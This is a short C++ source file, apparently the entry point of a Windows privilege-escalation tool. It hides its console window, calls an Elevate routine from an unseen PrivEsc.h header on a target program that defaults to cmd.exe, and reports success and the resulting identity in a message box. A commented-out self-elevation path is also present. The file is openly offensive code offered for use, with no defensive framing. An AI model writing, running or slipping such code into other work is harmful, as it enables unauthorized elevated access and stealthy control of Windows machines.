#include <string>
#include <windows.h>
#include "PrivEsc.h"

int main(int argc, char* argv[]) {
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);

    PrivEscalationClass esc;

    /*
    esc.SelfElevate();
    std::wstring currentUser = esc.GetProcessUserName(GetCurrentProcessId());
    std::wstring msg = L"Privilege escalation completed successfully.\n"
        L"Current Identity: " + currentUser;
    MessageBoxW(NULL, msg.c_str(), L"Privilege Escalation", MB_OK | MB_ICONINFORMATION);
    */

    std::wstring targetPath;
    if (argc > 1) {
        std::string arg(argv[1]);
        targetPath = std::wstring(arg.begin(), arg.end());
    }
    else {
        targetPath = L"C:\\Windows\\System32\\cmd.exe";
    }

    esc.Elevate(targetPath);

    std::wstring identity = esc.GetProcessUserName(GetCurrentProcessId());
    std::wstring successMsg = L"Privilege escalation completed successfully.\n"
        L"Target Path: " + targetPath + L"\n"
        L"Executed by: " + identity;
    MessageBoxW(NULL, successMsg.c_str(), L"Privilege Escalation", MB_OK | MB_ICONINFORMATION);

    return 0;
}
